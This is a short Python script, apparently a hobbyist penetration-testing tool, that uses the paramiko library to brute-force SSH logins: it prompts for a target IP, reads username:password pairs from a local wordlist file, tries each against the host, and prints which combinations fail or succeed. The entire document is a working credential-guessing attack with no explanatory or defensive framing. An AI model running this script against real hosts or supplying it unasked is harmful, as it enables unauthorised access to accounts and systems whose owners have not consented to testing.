import paramiko

ip_target=raw_input("Enter the host IP:")
ssh_instance=paramiko.SSHClient()
ssh_instance.set_missing_host_key_policy(paramiko.AutoAddPolicy())
dictionary=open("./password_lists/ssh_dict.txt","r")
for line in dictionary.readlines():
	(username,password)=line.strip().split(":")
	try:
		ssh_instance.connect(ip_target,username=username,password=password)

	except:
		print("[!]Incorrect Username and Password combination(%s,%s)" %(username,password))
	
	else:
		print("[+]Correct Username adn Password combination(%s,%s)" %(username,password))



ssh_instance.close()
